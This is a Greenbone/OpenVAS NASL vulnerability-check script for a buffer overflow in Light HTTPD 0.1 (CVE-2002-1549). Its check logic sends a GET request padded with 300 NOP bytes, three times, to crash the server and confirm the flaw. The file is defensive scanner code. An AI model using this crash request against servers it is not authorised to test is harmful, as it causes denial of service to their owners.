# Copyright (C) 2013 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.903207");
  script_version("2021-08-05T12:20:54+0000");
  script_cve_id("CVE-2002-1549");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2021-08-06 10:23:56 +0000 (Fri, 06 Aug 2021)");
  script_tag(name:"creation_date", value:"2013-04-26 14:47:16 +0530 (Fri, 26 Apr 2013)");
  script_name("Light HTTPD Buffer Overflow Vulnerability");

  script_xref(name:"URL", value:"http://en.securitylab.ru/poc/439850.php");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/24999");
  script_xref(name:"URL", value:"http://cxsecurity.com/issue/WLB-2013040182");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 3000);
  script_mandatory_keys("Light_HTTPd/banner");

  script_tag(name:"impact", value:"Successful exploitation will let the remote unauthenticated
  attackers to cause a buffer overflow, resulting in a denial of service or
  potentially allowing the execution of arbitrary code.");

  script_tag(name:"affected", value:"Light HTTPD 0.1.");

  script_tag(name:"insight", value:"The flaw exists due to improper handling of user-supplied input.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since
  the disclosure of this vulnerability. Likely none will be provided anymore. General solution options
  are to upgrade to a newer release, disable respective features, remove the product or replace the
  product by another one.");

  script_tag(name:"summary", value:"The host is running Light HTTPD and is prone to buffer overflow
  vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port(default:3000);

banner = http_get_remote_headers(port:port);
if(!banner || "Light HTTPd" >!< banner)
  exit(0);

if(http_is_dead(port:port))
  exit(0);

host = http_host_name(port:port);

crash = crap(data: "\x90", length: 300);
req = string("GET /", crash, " HTTP/1.0\r\n",
             "Host: ", host, "\r\n\r\n");

for(i = 0; i < 3; i++)
  http_send_recv(port:port, data:req);

if(http_is_dead(port:port)) {
  security_message(port:port);
  exit(0);
}

exit(99);
